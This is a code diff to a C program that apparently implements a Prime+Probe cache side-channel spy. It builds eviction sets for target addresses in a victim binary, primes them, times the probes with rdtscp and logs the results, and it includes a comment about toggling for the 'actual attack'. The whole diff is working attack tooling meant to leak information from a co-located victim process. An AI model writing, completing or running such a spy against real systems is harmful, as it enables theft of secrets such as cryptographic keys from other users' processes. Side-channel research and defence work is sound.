@@ -128,11 +128,17 @@ Targets *init_spy(Config *spy_conf, char *target_filepath, char *offset_target){
 
     // prepare monitoring
     Targets *targets = load_targets(target_filepath, offset_target);
-    for(size_t i=0; i<targets->number; i++){
-        targets->addresses[i]->evset = find_evset(spy_conf, targets->addresses[i]->adrs);
+    
+no_evset:
+    for(size_t i=0; i<targets->number; i++) targets->addresses[i]->evset = find_evset(spy_conf, targets->addresses[i]->adrs);
+    for(size_t i=0; i<targets->number; i++) if(targets->addresses[i]->evset==NULL) return NULL;
+    for(size_t i=0; i<targets->number; i++) { 
+        // restart find evset if no eviction set was found
+        if(*(targets->addresses[i]->evset)==NULL) goto no_evset;
+        printf("%lu, %lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
+        list_print(targets->addresses[i]->evset);
         targets->addresses[i]->msrmts = malloc(MSRMT_BUFFER*sizeof(uint64_t));
-    }    
-
+    }
     // Make sure output file exists.
     const char *output_filename = "./output_prime_probe.log";
     create_empty_file(output_filename);
@@ -173,18 +179,20 @@ void my_monitor(Config *spy_conf, Targets *targets){
 
         // wait 4000*no. of targets, eviction w 16 elems takes 1900 cycles, w 27 elems takes 3700 cycles
         unsigned long long diff = 4000*first;
+        
+        // Prime
+        for(size_t i=0; i<targets->number; i++) probe_evset_chase(spy_conf, targets->addresses[i]->evset);
         while(1){
             old_tsc=tsc;
             __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
             while (tsc - old_tsc < diff) __asm__ __volatile__ ("rdtscp" : "=A" (tsc));// ~2000 cycles for eviction, how choose distance?
 
-            // probe
+            // Probe
             for(size_t i=0; i<targets->number; i++){
                 targets->addresses[i]->msrmts[ctr]=probe_evset_chase(spy_conf, targets->addresses[i]->evset);
             }   
 
             if(ctr++ >= MSRMT_BUFFER) break; // toggle for actual attack
-            
         }
     }
     // Write results to fileappend_output(targets, output_filename);
@@ -203,6 +211,10 @@ void my_monitor(Config *spy_conf, Targets *targets){
 void spy(char *victim_filepath, char *offset_filepath){
     Config *spy_conf= config_init(16, 2048, 64, 110, 2097152);
     Targets *targets = init_spy(spy_conf, victim_filepath, offset_filepath);
+    if (targets==NULL) {
+        printf("[!] spy: init spy failed, abort!\n");
+        return;
+    }
     printf("[+] spy: spy init complete, monitoring");
     for(size_t i=0; i<targets->number; i++){
         printf(" %p", targets->addresses[i]->adrs);
@@ -213,6 +225,7 @@ void spy(char *victim_filepath, char *offset_filepath){
         }
     }
     printf(" now...\n");
+    for(size_t i=0; i<targets->number; i++) list_print(targets->addresses[i]->evset);
     my_monitor(spy_conf, targets);
 }
 
